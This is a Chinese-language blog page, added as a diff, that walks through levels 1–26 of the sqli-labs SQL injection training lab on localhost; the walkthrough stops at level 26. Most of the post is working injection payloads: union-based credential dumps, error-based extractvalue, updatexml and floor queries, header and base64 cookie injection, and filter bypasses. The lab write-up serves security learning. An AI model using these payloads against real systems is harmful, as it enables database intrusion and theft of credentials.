@@ -1,0 +1,359 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-lab | gudiffany_blog</title>
+<link rel="shortcut icon" href="https://gudiffany.github.io//favicon.ico?v=1664035675532">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://gudiffany.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqli-lab | gudiffany_blog - Atom Feed" href="https://gudiffany.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="sqli-labs
+less1
+
+先判断注入类型
+
+http://localhost/sqli-labs-master/Less-1/?id=1 and 1=1
+
+和
+http://localhost/sqli-labs-master/Le..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://gudiffany.github.io/">
+  <img class="avatar" src="https://gudiffany.github.io//images/avatar.png?v=1664035675532" alt="">
+  </a>
+  <h1 class="site-title">
+    gudiffany_blog
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/find" class="menu">
+          find
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-lab
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-08-14
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="sqli-labs">sqli-labs</h1>
+<h2 id="less1">less1</h2>
+<ol>
+<li>先判断注入类型</li>
+</ol>
+<pre><code class="language-mysql">http://localhost/sqli-labs-master/Less-1/?id=1 and 1=1
+</code></pre>
+<p>和</p>
+<pre><code class="language-mysql">http://localhost/sqli-labs-master/Less-1/?id=1 and 1=2
+</code></pre>
+<p>回显正常</p>
+<pre><code class="language-mysql">http://localhost/sqli-labs-master/Less-1/?id=1' and '1'='2
+</code></pre>
+<p>无回显，说明语句正确，逻辑错误，存在字符注入</p>
+<p>查出最大的列数</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=1' order by 4--+
+</code></pre>
+<p>数据库</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,database(),3--+
+</code></pre>
+<p>表</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3--+
+</code></pre>
+<p>列</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),3--+
+</code></pre>
+<p>字段</p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(username,password)from users),3--+
+</code></pre>
+<h2 id="less2">less2</h2>
+<p>方法与1同即可（但为数字型注入，无需--+）</p>
+<pre><code>http://localhost/sqli-labs-master/Less-2/?id=1 and 1=2
+</code></pre>
+<p>判断为数字型</p>
+<p>最后查询url为</p>
+<pre><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,(select group_concat(username,password)from users),3
+</code></pre>
+<h2 id="less3">less3</h2>
+<p>首先判断不是数字型，然后用字符型判断一下</p>
+<pre><code>http://localhost/sqli-labs-master/Less-3/?id=1'
+</code></pre>
+<p>发现多出一个）括号错误提示，加上）--+，回显正常，然后更深入判断闭合方式</p>
+<pre><code>http://localhost/sqli-labs-master/Less-3/?id=1') and ('1')=('1
+</code></pre>
+<p>发现闭合方式为（‘ ’）</p>
+<p>接下来沿用上面的注入语句即可</p>
+<pre><code>http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,(select group_concat(username,password)from users),3--+
+</code></pre>
+<h2 id="less4">less4</h2>
+<p>字符型，但是是双引号闭合的字符型，还要加上）</p>
+<pre><code>http://localhost/sqli-labs-master/Less-4/?id=1&quot;) and (&quot;1&quot;)=(&quot;1
+</code></pre>
+<p>最后</p>
+<pre><code>http://localhost/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,(select group_concat(username,password)from users),3--+
+</code></pre>
+<h2 id="less5">less5</h2>
+<p>本题不存在数据显示，所以union不起作用。如果数据不显示只有对错页面显示我们可以选择布尔盲注</p>
+<p>首先判断出是单引号闭合才出现报错</p>
+<pre><code>http://localhost/sqli-labs-master/Less-5/?id=1'
+</code></pre>
+<p>剩下的难题就是写脚本了（写了好久）</p>
+<h2 id="less6-less8">less6-less8</h2>
+<p>都是属于布尔盲注，需要先判断基本的报错类型，然后用脚本即可</p>
+<h2 id="less9-10">less9-10</h2>
+<p>不存在报错与正确页面，属于时间盲注(需要先构造database（）长度的语句判断闭合方式)</p>
+<p>剩下的还是脚本</p>
+<h2 id="less11-less16">less11-less16</h2>
+<p>为基于post的报错和布尔盲注，只要把get的改改就可以了</p>
+<h2 id="less17">less17</h2>
+<h3 id="1extractvalue">1.extractvalue</h3>
+<pre><code>1' and (extractvalue(1,concat('#',version(),'#')))#    爆版本
+
+1' and (extractvalue(1,concat('#',database(),'#')))#   爆数据库
+
+1' and (extractvalue(1,concat('#',(select table_name from information_schema.tables where table_schema=database() limit 1,1 ),'#')))#   爆表名
+
+1' and (extractvalue(1,concat('#',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),'#')))# 
+ 爆字段名
+
+1' and (extractvalue(1,concat('#',(select password from (select password from users where username='admin1') b) ,'#')))#      爆字段内容该格式针对mysql数据库。
+
+**需要再套一层select，select出的结果再通过中间表select一遍，这样就规避了错误。注意，这个问题只出现于mysql，mssql和Oracle不会出现此问题。**
+
+1' and (extractvalue(1,concat('#',(select group_concat(username,password) from users),'#')))#                      爆字段内容。
+
+**出现无法显示所有字段的情况加入limit进行脚本爆破即可
+</code></pre>
+<h3 id="2updatexml">2.updatexml</h3>
+<pre><code>123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
+123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
+   爆字段名
+
+123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
+
+1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
+</code></pre>
+<h3 id="3floor">3.floor</h3>
+<pre><code>select count(*) from information_schema.tables group by concat('#',语句,floor(rand(0)*2))基本语句格式
+
+123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
+
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+
+1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+</code></pre>
+<h2 id="less18-20">less18-20</h2>
+<p>通过更改表头进行注入</p>
+<pre><code>18：User-Agent:1' and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and '
+
+19：Referer: 1' and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and '
+
+20.Cookie: uname=1' and (updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)) and '
+</code></pre>
+<h2 id="less21">less21</h2>
+<p>经过base64加密，单引号闭合</p>
+<pre><code>Cookie: uname=MScgYW5kICh1cGRhdGV4bWwgKDEsY29uY2F0KDB4NWMsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpLDB4NWMpLDEpKSBhbmQgJw==
+</code></pre>
+<h2 id="less22">less22</h2>
+<p>双引号闭合</p>
+<pre><code>Cookie: uname=MSIgYW5kICh1cGRhdGV4bWwgKDEsY29uY2F0KDB4NWMsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpLDB4NWMpLDEpKSBhbmQgIg==
+</code></pre>
+<h2 id="less23">less23</h2>
+<pre><code>http://localhost/sqli-labs-master/Less-23/?id=1' and '1'='1
+</code></pre>
+<p>但是没办法通过--+来进行注释</p>
+<p>于是需要通过联合注入加上后面的‘1’=‘1来规避</p>
+<pre><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),3 and '1'='1
+</code></pre>
+<h2 id="less24">less24</h2>
+<p>根据测试，password都进行了限制，无法进行注入，但是用户名没有限制，而且有可以创造新用户的功能，尝试对用户名进行处理</p>
+<p>创造新用户admin’#</p>
+<p>对admin‘#更改密码</p>
+<p>用于没有对用户名进行限制，会直接对admin进行更改密码</p>
+<p>于是直接对admin进行登录</p>
+<h2 id="less25">less25</h2>
+<p>过滤所有的and和or字段</p>
+<p>绕过的方法有很多</p>
+<p>1.大小写转化（不行）</p>
+<p>2.双写</p>
+<pre><code>http://localhost/sqli-labs-master/Less-25/?id=-1' union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema = 'security')--+
+</code></pre>
+<p>对information也要双写</p>
+<p>3.利用符号形式（只对实际的or和and起作用，对单词内还是需要双写）</p>
+<p>||---or</p>
+<p>%26%26---and</p>
+<h2 id="less25a">less25a</h2>
+<p>将之前的脚本改一改</p>
+<p>1.information处，and处</p>
+<p>2.回显处改为Dumb（因为没有报错界面）</p>
+<h2 id="less26">less26</h2>
+<p>过滤了空格和注释，and，or</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#sqli-labs">sqli-labs</a>
+<ul>
+<li><a href="#less1">less1</a></li>
+<li><a href="#less2">less2</a></li>
+<li><a href="#less3">less3</a></li>
+<li><a href="#less4">less4</a></li>
+<li><a href="#less5">less5</a></li>
+<li><a href="#less6-less8">less6-less8</a></li>
+<li><a href="#less9-10">less9-10</a></li>
+<li><a href="#less11-less16">less11-less16</a></li>
+<li><a href="#less17">less17</a>
+<ul>
+<li><a href="#1extractvalue">1.extractvalue</a></li>
+<li><a href="#2updatexml">2.updatexml</a></li>
+<li><a href="#3floor">3.floor</a></li>
+</ul>
+</li>
+<li><a href="#less18-20">less18-20</a></li>
+<li><a href="#less21">less21</a></li>
+<li><a href="#less22">less22</a></li>
+<li><a href="#less23">less23</a></li>
+<li><a href="#less24">less24</a></li>
+<li><a href="#less25">less25</a></li>
+<li><a href="#less25a">less25a</a></li>
+<li><a href="#less26">less26</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://gudiffany.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
